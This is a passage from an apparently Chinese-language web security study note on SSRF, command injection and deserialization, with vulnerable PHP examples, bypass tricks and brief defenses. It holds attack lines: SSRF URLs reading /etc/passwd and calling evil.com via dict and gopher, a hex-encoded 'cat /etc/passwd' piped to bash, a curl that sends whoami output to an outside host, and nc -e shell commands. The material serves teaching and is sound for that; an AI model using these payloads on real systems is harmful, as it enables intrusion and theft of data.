title="SSRF原理"></a>SSRF原理</h3><p>SSRF服务器端跨站伪造请求，是一种攻击者构造由服务器端请求发起的一个安全漏洞。</p><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>攻击原理</p><p>攻击者控制内网的一台服务器进而攻击再同一内网的其他服务器</p><h3 id="SSRF产生原因"><a href="#SSRF产生原因" class="headerlink" title="SSRF产生原因"></a>SSRF产生原因</h3><p>服务器端的验证并没有对其请求获取图片的参数(image&#x3D;)做出严格的过滤以及限制，导致内网服务器可以获取内网其他服务器的数据。</p><p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。</p><h2 id="漏洞挖掘-1"><a href="#漏洞挖掘-1" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>1、分享：通过URL地址分享网页内容</p><p>​例如：<a href="http://test.com/share.do?link=http://www.baidu.com">http://test.com/share.do?link=http://www.baidu.com</a></p><p>2、转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。</p><p>3、在线翻译：通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p><p>4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</span><br></pre></td></tr></table></figure><p>5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p><p>6、图片加载与下载；通过url地址加载与下载图片</p><p>通过URL关键字中寻找</p><blockquote><p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>display<br>sourceURl<br>imageURL<br>domain</p></blockquote><h2 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h2><p>产生SSRF的函数主要是：</p><ol><li>file_get_contents()</li><li>sockopen()</li><li>curl_exec()</li></ol><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h3><p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#x27;url&#x27;])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">content = file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">filename =<span class="string">&#x27;/img/oldboy/&#x27;</span>.rand().<span class="string">&#x27;;img1.jpg&#x27;</span>;</span> </span><br><span class="line"><span class="meta prompt_">file_put_contents($</span><span class="language-bash">filename, <span class="variable">$content</span>);</span> </span><br><span class="line">echo $_POST[&#x27;url&#x27;]; </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">img = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span> </span><br><span class="line">&#125; </span><br><span class="line">echo $img; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="sockopen"><a href="#sockopen" class="headerlink" title="sockopen()"></a><strong>sockopen()</strong></h3><p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function GetFile($host,$port,$link) </span><br><span class="line">&#123; </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">fp = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30);</span> </span><br><span class="line">if (!$fp) &#123; </span><br><span class="line">echo &quot;$errstr (error number $errno) \n&quot;; </span><br><span class="line">&#125; else &#123; </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">out = <span class="string">&quot;GET <span class="variable">$link</span> HTTP/1.1\r\n&quot;</span>;</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">out .= <span class="string">&quot;Host: <span class="variable">$host</span>\r\n&quot;</span>;</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">out .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">out .= <span class="string">&quot;\r\n&quot;</span>;</span> </span><br><span class="line"><span class="meta prompt_">fwrite($</span><span class="language-bash">fp, <span class="variable">$out</span>);</span> </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">contents=<span class="string">&#x27;&#x27;</span>;</span> </span><br><span class="line">while (!feof($fp)) &#123; </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">contents.= fgets(<span class="variable">$fp</span>, 1024);</span> </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta prompt_">fclose($</span><span class="language-bash">fp);</span> </span><br><span class="line">return $contents; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a><strong>curl_exec()</strong></h3><p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#x27;url&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="built_in">link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">curlobj = curl_init();</span></span><br><span class="line"><span class="meta prompt_">curl_setopt($</span><span class="language-bash">curlobj, CURLOPT_POST, 0);</span></span><br><span class="line"><span class="meta prompt_">curl_setopt($</span><span class="language-bash">curlobj,CURLOPT_URL,<span class="variable">$link</span>);</span></span><br><span class="line"><span class="meta prompt_">curl_setopt($</span><span class="language-bash">curlobj, CURLOPT_RETURNTRANSFER, 1);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">result=curl_exec(<span class="variable">$curlobj</span>);</span></span><br><span class="line"><span class="meta prompt_">curl_close($</span><span class="language-bash">curlobj);</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">filename = <span class="string">&#x27;./curled/&#x27;</span>.rand().<span class="string">&#x27;.txt&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">file_put_contents($</span><span class="language-bash">filename, <span class="variable">$result</span>);</span> </span><br><span class="line">echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>注意事项</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">file_get_contents的gopher协议不能URL编码</span><br><span class="line">file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">curl/libcurl 7.43 上gopher协议存在bug(\%00截断) 经测试7.49 可用</span><br><span class="line">curl_exec() 默认不跟踪跳转，</span><br><span class="line">file_get_contents() file_get_contents支持php://input协议</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="URL伪协议"><a href="#URL伪协议" class="headerlink" title="URL伪协议"></a>URL伪协议</h2><p><strong>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</strong></p><p>file:&#x2F;&#x2F;&#x2F; 从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>dict:&#x2F;&#x2F; 字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：<br>sftp:&#x2F;&#x2F; SSH文件传输协议或安全文件传输协议<br>ldap:&#x2F;&#x2F; 轻量级目录访问协议<br>tftp:&#x2F;&#x2F; 简单文件传输协议<br>gopher:&#x2F;&#x2F; 分布式文档传递服务，可使用gopherus生成payload</p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>这种URL Schema可以尝试从文件系统中获取文件：</p><p><code>http://example.com/ssrf.php?url=file:///etc/passwd</code></p><p><code>http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</code></p><p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p><h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表</p><p><a href="http://example.com/ssrf.php?dict://evil.com:1337/">http://example.com/ssrf.php?dict://evil.com:1337/</a><br>evil.com:$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp&#x2F;*]<br>accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</p><h3 id="sftp"><a href="#sftp" class="headerlink" title="sftp"></a>sftp</h3><p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a><strong>gopher</strong></h3><p>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</p><p>SSRF漏洞利用中gopher可以说是万金油，因为可以使用gopher发送各种格式的请求包，这样变可以解决漏洞点不在GET参数的问题了。 </p><p>基本协议格式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt; </span><br></pre></td></tr></table></figure><blockquote><p><a href="http://example.com/ssrf.php?url=http://attacker.com/gopher.php">http://example.com/ssrf.php?url=http://attacker.com/gopher.php</a> gopher.php (host it on acttacker.com):-&lt;?php header(‘Location: gopher:&#x2F;&#x2F;evil.com:1337&#x2F;_Hi%0Assrf%0Atest’);?&gt;<br>evil.com:# nc -lvp 1337<br>Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp&#x2F;*] accepted (family 2, sport 49398)Hissrftest</p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p><p>5.利用file协议读取本地文件等。.</p><p>6.各个协议调用探针：http,file,dict,ftp,gopher等</p><p>http:192.168.64.144&#x2F;phpmyadmin&#x2F;<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;192.168.64.144:3306&#x2F;info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><p><strong>1、限制为<a href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</strong></p><blockquote><p>可以尝试采用http基本身份认证的方式绕过<br>如：<a href="http://www.aaa.com%40www.bbb.com%40www.ccc.com%EF%BC%8C%E5%9C%A8%E5%AF%B9@解析域名中,不同的处理函数存在处理差异/">http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</a><br>在PHP的parse_url中会识别<a href="http://www.ccc.com,而libcurl则识别为www.bbb.com./">www.ccc.com，而libcurl则识别为www.bbb.com。</a></p></blockquote><p><strong>2、采用短地址绕过</strong></p><blockquote><p>比如百度短地址<a href="https://dwz.cn/">https://dwz.cn/</a></p></blockquote><p><strong>3.采用进制转换</strong></p><blockquote><p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p></blockquote><p><strong>4.利用特殊域名</strong></p><blockquote><p>原理是DNS解析。xip.io可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p></blockquote><p><strong>5.利用[::]</strong></p><blockquote><p>可以利用[::]来绕过localhost<br><a href="http://169.254.169.254>>http://[::169.254.169.254]">http://169.254.169.254&gt;&gt;http://[::169.254.169.254]</a></p></blockquote><p><strong>6.利用句号</strong></p><blockquote><p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p></blockquote><p><strong>7、CRLF 编码绕过</strong></p><blockquote><p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p><p>1 example.com&#x2F;?url&#x3D;<a href="http://eval.com/%0d/%0aHOST:fuzz.com/%0d/%0a">http://eval.com\%0d\%0aHOST:fuzz.com\%0d\%0a</a> </p></blockquote><p><strong>8.利用封闭的字母数字</strong></p><blockquote><p>利用Enclosed alphanumerics<br>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com<br><a href="http://169.254.169.254>>>http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</a><br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</p></blockquote><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>1）过滤192.168.0.0&#x2F;10.0.0.0&#x2F;172.16.0.0  localhost 私有地址、ipv6地址</p><p>2）过滤file:&#x2F;&#x2F;&#x2F;    、 dict:&#x2F;&#x2F;   、gopher:&#x2F;&#x2F;   、ftp:&#x2F;&#x2F;、 http:&#x2F;&#x2F;   https:&#x2F;&#x2F;    php:&#x2F;&#x2F;&#x2F;危险schema</p><p>3）白名单过滤</p><p>4）对返回的内容进行识别</p><h2 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h2><p><a href="./doc/11%E3%80%81SSRF%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.docx">.&#x2F;doc&#x2F;11、SSRF攻击技术.docx</a></p><p><a href="./doc/SSRF%E6%94%BB%E5%87%BB.xmind">.&#x2F;doc&#x2F;SSRF攻击.xmind</a></p><h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><h2 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一。</p><p>如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有system( )、exec( )、shell_exec( )、passthru( )、pcntl_execl( )、popen( )、proc_open( )等，当攻击者可以控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击<br>PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大</p><p><strong>漏洞原理</strong></p><p>​应用程序有时需要调用一些执行系统命令的函数,如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令，当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行漏洞</p><p><strong>漏洞危害</strong></p><ul><li>继承Web服务器程序的权限，去执行系统命令或读写文件</li><li>反弹shell</li><li>控制整个网站，甚至控制整个服务器</li></ul><p><strong>漏洞产生的原因</strong></p><ol><li>没有对用户的输入进行过滤或者过滤不严格</li><li>系统漏洞造成的代码执行</li><li>调用第三方组件存在代码执行漏洞</li></ol><h2 id="可能存在漏洞的函数"><a href="#可能存在漏洞的函数" class="headerlink" title="可能存在漏洞的函数"></a>可能存在漏洞的函数</h2><h3 id="利用系统函数实现远程命令执行的函数"><a href="#利用系统函数实现远程命令执行的函数" class="headerlink" title="利用系统函数实现远程命令执行的函数"></a>利用系统函数实现远程命令执行的函数</h3><p>常见出现漏洞的地方：</p><p>​只要带参数的地方都可能出现命令执行漏洞</p><p>​常见的路由器、防火墙、入侵检测、自动化运维平台</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval（）、assert（）、preg_replace（）、call_user_func（）</span><br></pre></td></tr></table></figure><p>如果页面存在以上的函数并且对用户的输入没有做严格的过滤，就存在RCE命令执行漏洞，还有其他的函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ob_start（）、unserialize（）、creat_function（） 、usort（）、uasort（）、uksort（）、 array_filter（）、 array_reduce（）、 array_map（）</span><br></pre></td></tr></table></figure><h3 id="直接执行系统命令的函数"><a href="#直接执行系统命令的函数" class="headerlink" title="直接执行系统命令的函数"></a>直接执行系统命令的函数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system（），exec（），shell_exec（），passthru（）， pcntl_exec（）， popen（）， proc_open（），反引号</span><br></pre></td></tr></table></figure><h2 id="命令拼接符"><a href="#命令拼接符" class="headerlink" title="命令拼接符"></a>命令拼接符</h2><p>命令拼接符是进行命令链接的基础，会使用命令拼接符才是利用命令执行漏洞的基础</p><h3 id="Windows常用命令拼接符"><a href="#Windows常用命令拼接符" class="headerlink" title="Windows常用命令拼接符"></a>Windows常用命令拼接符</h3><p><img src="/img/oldboy/image-20250309180405696.png" alt="image-20250309180405696"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp;：拼接符两边只要有一个真就会执行</span><br><span class="line">&amp;&amp;：命令拼接符拼接多个命令时，会按照顺序执行，当遇到假的命令时会将终止执行。</span><br><span class="line">|：命令拼接符拼接多个命令时，只要有一个为假，其余都不执行；如果遇到为真则都执行，但是执行回显最后一个指令的运行结果。</span><br><span class="line">||：拼接多个指令时，按照顺序执行，执行完一个真的命令，则终止执行。</span><br></pre></td></tr></table></figure><h3 id="Linux的系统命令拼接符"><a href="#Linux的系统命令拼接符" class="headerlink" title="Linux的系统命令拼接符"></a>Linux的系统命令拼接符</h3><p>第一个是”&amp;”</p><p>​‘&amp;’的作用是使命令在后台运行。只要在命令后面跟空格和&amp;，就可以在后台运行命令，终止方法是kill -s 进程号</p><p>第二个是”;”</p><p>​就是<strong>分号</strong>，作用就是可以进行多条命令的无关联执行，每一条执行结果互不影响</p><p>第三个是”&amp;&amp;”</p><p>​左边成功运行再执行右边</p><p>第四个是”||“</p><pre><code> 这个也跟windows一样，前面执行失败才执行后面</code></pre><p>第五个是”()”</p><p>​如果想执行几个命令，则需要用<strong>命令分隔符分号隔开每个命令</strong>，并使用圆括号()把所有命令组合起来</p><h2 id="绕过方式-1"><a href="#绕过方式-1" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>如果命令注入的网站过滤了某些分隔符，可以将分隔符编码后（url编码，base等）绕过</p><h3 id="八进制绕过"><a href="#八进制绕过" class="headerlink" title="八进制绕过"></a>八进制绕过</h3><blockquote><p>&#x2F;&#x2F;ls命令，这个编码后可以拼接</p><p>$(printf  “\154\163”)</p></blockquote><h3 id="十六进制字符绕过"><a href="#十六进制字符绕过" class="headerlink" title="十六进制字符绕过"></a>十六进制字符绕过</h3><blockquote><p>echo “636174202F6574632F706173737764” | xxd -r -p|bash</p></blockquote><p><img src="https://i-blog.csdnimg.cn/blog_migrate/1d24adfefdb0aa6926476286b1348d15.png#pic_center" alt="在这里插入图片描述"></p><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><blockquote><p>Linux内置分隔符：${IFS},$IFS,$IFS$9</p></blockquote><p><img src="https://i-blog.csdnimg.cn/blog_migrate/d7debf88466e4517cd3056268b6a1d73.png#pic_center" alt="在这里插入图片描述"></p><p>利用重定向符<code>&lt;&gt;</code></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/db099bc3bbe9484a136f3ed58cb8a732.png#pic_center" alt="在这里插入图片描述"></p><h3 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h3><ul><li><p>通过拆分命令达到绕过的效果：<code>a=1;b=s;\$a\$b</code></p></li><li><p>空变量绕过：<code>cat fl$&#123;x&#125;ag</code> <code>cat tes$(z)t/flag</code></p></li><li><p>控制环境变量绕过：</p><p>先利用echo $PATH得到环境变量 &#x3D;&gt; “&#x2F;usr&#x2F;local&#x2F;….blablabla”<br>接着利用echo${PATH}得到长度<br>然后要哪个字符截取哪个字符就行<br>${PATH:0:1} &#x3D;&gt; ‘&#x2F;’<br>${PATH:1:1} &#x3D;&gt; ‘u’<br>${PATH:0:4} &#x3D;&gt; ‘&#x2F;usr’</p></li><li><p>空值绕过：<code>cat fl&quot;&quot;ag</code> <code>cat fl&#39;&#39;ag</code> <code>cat &quot;fl&quot;&quot;ag&quot;</code></p></li><li><p>反斜杠绕过：<code>ca\t flag</code> <code>l\s</code></p></li></ul><p><img src="/img/oldboy/35de9c0767cf41e5b1efe363b2ff5d77.png" alt="在这里插入图片描述"></p><h3 id="空变量"><a href="#空变量" class="headerlink" title="空变量"></a>空变量</h3><blockquote><p>$*和$@，$x(x 代表 1-9)，${x}(x&gt;&#x3D;10)：比如<code>ca$&#123;21&#125;t a.txt</code>表示<code>cat a.txt</code><br>在没有传入参数的情况下，这些特殊字符默认为空，如下:</p><ul><li>wh$1oami</li><li>who$@ami</li><li>whoa$*mi</li></ul></blockquote><p><img src="https://i-blog.csdnimg.cn/blog_migrate/4d4de863ab4dd7a2ffd8f9f36ed16568.png#pic_center" alt="在这里插入图片描述"></p><h3 id="花括号的用法"><a href="#花括号的用法" class="headerlink" title="花括号的用法"></a>花括号的用法</h3><blockquote><p>在Linux bash中还可以使用<code>&#123;OS_COMMAND,ARGUMENT&#125;</code>来执行系统命令<code>&#123;cat,flag&#125;</code></p></blockquote><p><img src="https://i-blog.csdnimg.cn/blog_migrate/6d23bc87860d7467f7a4ae12ce50b24a.png#pic_center" alt="在这里插入图片描述"></p><h3 id="无回显的命令执行"><a href="#无回显的命令执行" class="headerlink" title="无回显的命令执行"></a>无回显的命令执行</h3><p>可以通过curl命令将命令的结果输出到访问的url中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.rayi.vip/`whoami`</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在服务器日志中可看到：<code>xx.xx.xx.xx - - [12/Aug/2019:10:32:10 +0800] &quot;GET /root HTTP/1.1&quot; 404 146 &quot;-&quot; &quot;curl/7.58.0&quot;</code>，这样，命令的回显就能在日志中看到了</p><h3 id="读文件命令"><a href="#读文件命令" class="headerlink" title="读文件命令"></a>读文件命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sort|cut|xxd</span><br></pre></td></tr></table></figure><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -L -p 9090-e cmd.exe (Windows)</span><br><span class="line"></span><br><span class="line">nc -l -p 9090-e /bin/bash (*nix)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><p>1、各种框架、插件等位置都有可能出现命令执行，升级到新版本，多打补丁</p><p>2、关注行业最新安全动态，一旦爆发命令执行漏洞，迅速修复，避免造成更大影响</p><p>3、少用框架&#x2F;CMS</p><p>4、可以过滤一些符号从而减少一些危险</p><p>5、安全配置好php相关参数      </p><p>​通过Php配置文件里面有个disable_functions &#x3D; 配置，这个禁止某些php函数， 服务器便是用这个来禁止php的执行命令函数。</p><p>6、升级中间件</p><p>7、严格控制传入变量，严禁使用魔法函数</p><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="基础知识-3"><a href="#基础知识-3" class="headerlink" title="基础知识"></a>基础知识</h2><p>序列化：把对象转换成字节序列的过程，即把对象转换为可以存储或传输的数据过程。</p><p>反序列化：八字节序列恢复成对象的过程，即把可以存储或传输的数据转化为对象的过程。</p><p><strong>漏洞产生的原因</strong></p><p>在身份验证，文件读写，数据传输等功能处，在未对反序列化接口做访问控制，未对序列化数据做加密和签名，加密密钥使用硬编码（如Shiro 1.2.4），使用不安全的反序列化框架库（如Fastjson 1.2.24）或函数的情况下，由于序列化数据可被用户控制，攻击者可以精心构造恶意的序列化数据（执行特定代码或命令的数据）传递给应用程序，在应用程序反序列化对象时执行攻击者构造的恶意代码，达到攻击者的目的</p><p><strong>产生原理</strong></p><p>serialize() 和 unserialize() 在 PHP内部实现上是没有漏洞的，之所以会产生反序列化漏洞是因为应用程序在处理对象、魔术函数以及序列化相关问题的时候导致的。 当传给 unserialize() 的参数可控时，那么用户就可以注入精心构造的 payload。当进行反序列化的时候就有可能会触发对象中的一些魔术方法，造成意想不到的危害。</p><h2 id="防范措施-1"><a href="#防范措施-1" class="headerlink" title="防范措施"></a>防范措施</h2><ol><li><strong>更新和修补：</strong> 更新应用程序和库到最新版本，修补已知的漏洞。</li><li><strong>代码审计：</strong> 对代码进行安全审计，查找和修复潜在的反序列化问题。</li><li><strong>使用安全配置：</strong> 使用安全配置选项来限制反序列化操作。</li></ol><h1 id="CSRF客户端伪造请求"><a 